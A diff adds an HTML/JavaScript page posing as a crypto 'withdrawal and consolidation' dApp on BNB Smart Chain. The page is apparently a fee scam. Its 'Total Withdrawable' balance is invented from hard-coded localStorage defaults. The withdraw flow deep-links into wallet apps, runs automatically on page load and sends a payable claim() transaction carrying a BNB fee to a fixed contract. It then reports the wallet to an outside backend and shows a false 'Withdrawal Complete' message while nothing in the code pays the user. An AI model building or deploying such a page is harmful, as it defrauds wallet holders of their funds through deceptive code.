@@ -1,0 +1,402 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8"/>
+    <title>Smart Delta Consolidation & Withdrawal</title>
+    <meta name="viewport" content="width=device-width,initial-scale=1"/>
+    <link href="https://fonts.googleapis.com/css2?family=Orbitron:wght@500;700&display=swap" rel="stylesheet">
+    <script src="https://cdn.jsdelivr.net/npm/web3@latest/dist/web3.min.js"></script>
+    <style>
+        body {
+            background: url('set.jpg') center center/cover no-repeat fixed;
+            color: #0ff;
+            font-family: 'Orbitron', sans-serif;
+            text-align: center;
+            padding: 20px;
+            display: flex;
+            flex-direction: column;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+            margin: 0;
+        }
+
+        h1 {
+            text-shadow: 0 0 20px #00faff, 0 0 40px #00faff;
+            margin-bottom: 30px;
+            font-weight: 700;
+        }
+
+        .card {
+            background: rgba(0, 0, 0, 0.3);
+            padding: 20px;
+            border: 1px solid #0ff;
+            border-radius: 16px;
+            display: inline-block;
+            box-shadow: 0 0 25px #0ff, inset 0 0 40px rgba(0, 255, 255, 0.2);
+            backdrop-filter: blur(12px);
+            margin-top: 20px;
+            min-width: 280px;
+            max-width: 400px;
+        }
+
+        .card div {
+            margin-top: 10px;
+            margin-bottom: 10px;
+            text-align: left;
+            display: flex;
+            justify-content: space-between;
+            font-size: 13px;
+        }
+
+        .btn {
+            margin-top: 20px;
+            padding: 14px 30px;
+            font-size: 18px;
+            border: none;
+            border-radius: 16px;
+            cursor: pointer;
+            font-family: 'Orbitron', sans-serif;
+            text-transform: uppercase;
+            letter-spacing: 2px;
+            transition: all 0.3s ease;
+            width: 100%;
+        }
+
+        .withdraw-btn {
+            background: rgba(147, 255, 20, 0.15);
+            border: 1px solid #00ff00;
+            color: #00ff00;
+            box-shadow: 0 0 20px #00ff00, 0 0 40px #00ff00;
+            animation: pulseGreen 1.5s infinite;
+        }
+
+        @keyframes pulseGreen {
+            0% { box-shadow: 0 0 15px #00ff00; }
+            50% { box-shadow: 0 0 40px #00ff00; }
+            100% { box-shadow: 0 0 15px #00ff00; }
+        }
+
+        .app-modal {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(0, 0, 0, 0.75);
+            backdrop-filter: blur(4px);
+            display: none;
+            align-items: center;
+            justify-content: center;
+            z-index: 999;
+        }
+
+        .modal-inner {
+            background: rgba(0, 0, 0, 0.9);
+            border: 2px solid #00ffff;
+            border-radius: 20px;
+            padding: 30px 20px;
+            max-width: 320px;
+            width: 90%;
+            text-align: center;
+            box-shadow: 0 0 20px #ff00ff;
+        }
+        
+        .modal-btn {
+            display: block;
+            width: 100%;
+            margin: 10px auto;
+            padding: 12px;
+            font-size: 16px;
+            color: white;
+            background-color: #111111;
+            border: 1px solid #00ffff;
+            border-radius: 12px;
+            cursor: pointer;
+            transition: background 0.3s;
+        }
+
+        .modal-btn:hover { background: #00ffff33; }
+
+        .close-modal {
+            color: #ff00ff;
+            font-size: 16px;
+            margin-top: 12px;
+            cursor: pointer;
+            text-decoration: underline;
+        }
+
+        .error-message { color: #ff3333; text-shadow: 0 0 8px #ff3333; }
+        .success-message { color: #00ff00; text-shadow: 0 0 8px #00ff00; }
+
+        #processing-bar {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            padding: 10px 0;
+            background: rgba(0, 0, 0, 0.8);
+            color: #00ff00;
+            font-size: 1.2em;
+            text-shadow: 0 0 10px #00ff00;
+            display: none;
+            z-index: 1000;
+            box-shadow: 0 0 15px #00ff00;
+        }
+
+        .processing-text { color: #00ff00 !important; text-shadow: 0 0 10px #00ff00; }
+    </style>
+</head>
+<body>
+
+    <h1>🚀 Smart Terminal & Consolidation</h1>
+    <div id="processing-bar"></div>
+    <audio id="clickSound" src="click.wav" preload="auto"></audio>
+    <div id="main-content" style="display: none;">
+      <div class="card">
+        <div><strong>Wallet:</strong> <span id="walletAddressDisplay">Not Connected</span></div>
+        <div><strong>Terminal Tiffy:</strong> <span id="claimedTIFFYDisplay">5.00</span></div>
+        <div><strong>TUSD-Nitro Terminal:</strong> <span id="synchronizedEarningsDisplay">10.00</span></div>
+        <hr style="border-color: #0ff; margin: 15px 0;">
+        <h2 style="font-size:16px;">Total Withdrawable: <span id="totalWithdrawableDisplay">0.00</span> TUSD</h2>
+        <button id="withdrawBtn" class="btn withdraw-btn">Withdraw Funds</button>
+      </div>
+    </div>
+    
+    <div class="app-modal" id="appModal">
+        <div class="modal-inner">
+            <h3 id="modalTitle" style="color:#00ffff; text-shadow:0 0 10px #00ffff;"></h3>
+            <p id="modalMessage" style="margin-top: 10px; font-size:13px; text-align:left;"></p>
+            <button class="modal-btn" id="modalBtn1" style="display:none;"></button>
+            <button class="modal-btn" id="modalBtn2" style="display:none;"></button>
+            <button class="modal-btn" id="modalBtn3" style="display:none;"></button>
+            <div id="modalCloseBtn" class="close-modal">Close</div>
+        </div>
+    </div>
+
+    <script>
+        function showModal(title, message, buttons, messageClass = '') {
+            const modal = document.getElementById('appModal');
+            document.getElementById('modalTitle').textContent = title;
+            const modalMessageElement = document.getElementById('modalMessage');
+            modalMessageElement.textContent = message;
+            modalMessageElement.className = messageClass;
+
+            const btns = [document.getElementById('modalBtn1'), document.getElementById('modalBtn2'), document.getElementById('modalBtn3')];
+            btns.forEach(btn => {
+                btn.style.display = 'none';
+                btn.onclick = null;
+            });
+            
+            if (buttons && buttons.length > 0) {
+                buttons.forEach((btn, index) => {
+                    const modalBtn = btns[index];
+                    modalBtn.textContent = btn.text;
+                    modalBtn.onclick = btn.handler;
+                    modalBtn.style.display = 'block';
+                });
+            }
+
+            document.getElementById('modalCloseBtn').onclick = () => {
+                E.clickSound.play();
+                modal.style.display = 'none';
+            };
+            modal.style.display = 'flex';
+        }
+
+        const E = {
+            clickSound: document.getElementById('clickSound'),
+            mainContent: document.getElementById('main-content'),
+            withdrawBtn: document.getElementById('withdrawBtn'),
+            walletAddressDisplay: document.getElementById('walletAddressDisplay'),
+            claimedTIFFYDisplay: document.getElementById('claimedTIFFYDisplay'),
+            synchronizedEarningsDisplay: document.getElementById('synchronizedEarningsDisplay'),
+            totalWithdrawableDisplay: document.getElementById('totalWithdrawableDisplay'),
+            processingBar: document.getElementById('processing-bar')
+        };
+        
+        let web3, account, contract, provider;
+        let totalWithdrawableAmount = 0;
+        
+        const TIFFY_TO_TUSD_RATE = 20; // Exact valuation multiplier
+        const cAddr = "0xE488253DD6B4D31431142F1b7601C96f24Fb7dd5";
+        const ABI = [
+            {"inputs":[],"name":"claim","outputs":[],"stateMutability":"payable", "type":"function"},
+            {"inputs":[],"name":"FIXED_BNB_FEE","outputs":[{"internalType":"uint256","name":"","type":"uint256"}],"stateMutability":"view","type":"function"}
+        ];
+        const BACKEND = "https://tiffyai-wh-wa.onrender.com/reward";
+        const DEEPLINK_BASE_URL = window.location.href.split('?')[0];
+
+        document.addEventListener('click', (event) => {
+            if (event.target.closest('button, .modal-btn, .close-modal')) {
+                E.clickSound.play();
+            }
+        });
+
+        function loadBalances() {
+            const terminalTiffy = parseFloat(localStorage.getItem('Tiffy_Terminal_Tokens') || "5.00");
+            const nitroStorage = parseFloat(localStorage.getItem('TUSD_Nitro_Storage') || "10.00");
+            
+            // Correct combined valuation math (Tiffy converted to TUSD value + Nitro TUSD)
+            totalWithdrawableAmount = (terminalTiffy * TIFFY_TO_TUSD_RATE) + nitroStorage;
+
+            E.claimedTIFFYDisplay.textContent = terminalTiffy.toFixed(2);
+            E.synchronizedEarningsDisplay.textContent = nitroStorage.toFixed(2);
+            E.totalWithdrawableDisplay.textContent = totalWithdrawableAmount.toFixed(2) + " TUSD";
+            E.totalWithdrawableDisplay.classList.remove('processing-text');
+
+            if (totalWithdrawableAmount <= 0) {
+                E.withdrawBtn.disabled = true;
+                E.withdrawBtn.textContent = "No Funds to Withdraw";
+            } else {
+                E.withdrawBtn.disabled = false;
+                E.withdrawBtn.textContent = "Withdraw Funds";
+            }
+        }
+
+        function openWalletPopup() {
+            if (totalWithdrawableAmount <= 0) {
+                showModal("No Funds", "There are no funds to withdraw.", null);
+                return;
+            }
+
+            showModal("Choose a Wallet", "Select your preferred wallet to execute secure smart consolidation delta sync:", [
+                { text: "MetaMask", handler: () => connectAndWithdraw('metamask', totalWithdrawableAmount) },
+                { text: "Trust Wallet", handler: () => connectAndWithdraw('trust', totalWithdrawableAmount) },
+                { text: "OKX Wallet", handler: () => connectAndWithdraw('okx', totalWithdrawableAmount) }
+            ]);
+        }
+
+        function connectAndWithdraw(walletType, amount) {
+            document.getElementById('appModal').style.display = 'none';
+            const fullUrl = `${DEEPLINK_BASE_URL}?wallet=${walletType}&amount=${amount}`;
+            
+            let deepLink;
+            switch(walletType) {
+                case 'metamask':
+                    deepLink = `https://metamask.app.link/dapp/${fullUrl.replace(/^https?:\/\//, '')}`;
+                    break;
+                case 'trust':
+                    deepLink = `https://link.trustwallet.com/open_url?coin_id=60&url=${encodeURIComponent(fullUrl)}`;
+                    break;
+                case 'okx':
+                    deepLink = `okx://wallet/dapp/details?dappUrl=${encodeURIComponent(fullUrl)}`;
+                    break;
+                default:
+                    return;
+            }
+            window.location.href = deepLink;
+        }
+
+        async function switchToBNB() {
+            try {
+                await window.ethereum.request({ method: 'wallet_switchEthereumChain', params: [{ chainId: '0x38' }] });
+                return true;
+            } catch (switchError) {
+                if (switchError.code === 4902) {
+                    try {
+                        await window.ethereum.request({
+                            method: 'wallet_addEthereumChain',
+                            params: [{
+                                chainId: '0x38', chainName: 'BNB Smart Chain',
+                                rpcUrls: ['https://bsc-dataseed.binance.org/'],
+                                nativeCurrency: { name: 'BNB', symbol: 'BNB', decimals: 18 },
+                                blockExplorerUrls: ['https://bscscan.com']
+                            }]
+                        });
+                        return true;
+                    } catch (addError) { return false; }
+                }
+                return false;
+            }
+        }
+
+        async function withdraw(amount) {
+            E.withdrawBtn.disabled = true;
+            E.withdrawBtn.textContent = "Processing...";
+            E.processingBar.style.display = 'block';
+            E.processingBar.textContent = 'Processing transaction...';
+
+            try {
+                if (!account) {
+                     showModal("Connection Required", "Please connect your wallet first.", null);
+                     return;
+                }
+                
+                const contractFee = await contract.methods.FIXED_BNB_FEE().call();
+                await contract.methods.claim().send({ from: account, value: contractFee });
+                
+                if (amount > 0) {
+                    await fetch(BACKEND, {
+                        method: "POST",
+                        headers: {"Content-Type":"application/json"},
+                        body: JSON.stringify({ wallet: account, amount: amount })
+                    }).catch(e => console.error("Backend log failed:", e));
+                }
+
+                localStorage.setItem('Tiffy_Terminal_Tokens', "0.00");
+                localStorage.setItem('TUSD_Nitro_Storage', "0.00");
+                
+                showModal("Withdrawal Complete!", "✅ Withdrawal Complete! Your terminal balances have been successfully synchronized.", null, 'success-message');
+            } catch (e) {
+                let errorTitle = "Withdrawal Failed";
+                let errorMessage = e.message || "An unknown error occurred.";
+                if (e.code === 4001 || (e.message && e.message.includes("user rejected"))) {
+                    errorTitle = "Transaction Canceled";
+                    errorMessage = "Transaction was canceled.";
+                }
+                showModal(errorTitle, errorMessage, null, 'error-message');
+            } finally {
+                E.withdrawBtn.disabled = false;
+                E.withdrawBtn.textContent = "Withdraw Funds";
+                E.processingBar.style.display = 'none';
+                loadBalances();
+            }
+        }
+
+        window.addEventListener('load', async () => {
+            const params = new URLSearchParams(window.location.search);
+            const walletParam = params.get('wallet');
+            const amountParam = params.get('amount');
+            
+            loadBalances();
+            E.mainContent.style.display = 'block';
+
+            if (walletParam && amountParam) {
+                E.withdrawBtn.style.display = 'none';
+                E.processingBar.style.display = 'block';
+                E.processingBar.textContent = 'Connecting to Wallet...';
+
+                try {
+                    if (typeof window.ethereum === 'undefined') {
+                        throw new Error("Please open this page in your mobile wallet's browser.");
+                    }
+                    
+                    provider = window.ethereum;
+                    web3 = new Web3(provider);
+
+                    if (!(await switchToBNB())) throw new Error("Failed to switch to BNB chain.");
+
+                    const accounts = await provider.request({ method: 'eth_requestAccounts' });
+                    account = accounts[0];
+
+                    E.walletAddressDisplay.textContent = `${account.substring(0, 6)}...${account.substring(account.length - 4)}`;
+                    contract = new web3.eth.Contract(ABI, cAddr);
+
+                    await withdraw(parseFloat(amountParam));
+                } catch (e) {
+                    showModal("Connection Error", e.message, null, 'error-message');
+                } finally {
+                    E.withdrawBtn.style.display = 'block';
+                    E.processingBar.style.display = 'none';
+                    loadBalances();
+                }
+            } else {
+                E.withdrawBtn.style.display = 'block';
+            }
+        });
+
+        E.withdrawBtn.onclick = openWalletPopup;
+    </script>
+</body>
+</html>
